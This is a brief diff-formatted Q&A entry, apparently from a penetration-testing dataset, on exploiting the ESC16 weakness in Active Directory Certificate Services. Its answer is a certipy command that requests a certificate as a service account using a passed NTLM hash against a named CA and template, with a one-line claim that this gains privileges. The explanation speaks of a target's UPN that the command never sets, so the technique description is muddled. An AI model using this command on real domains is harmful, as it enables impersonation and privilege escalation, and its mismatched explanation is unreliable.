@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you leverage the ESC16 vulnerability in ADCS?
+
+CONTEXT:
+You have access and want to exploit certificate enrollment.
+
+METHOD / ANSWER:
+Command: `certipy req -u ca_svc -hashes <NTLM_hash> -ca fluffy-DC01-CA -template WebServer -application-policies 'Client Authentication'`
+Explanation: This command requests a certificate using the UPN of a targeted account, leveraging the exploitation of ESC16 to gain privileges.
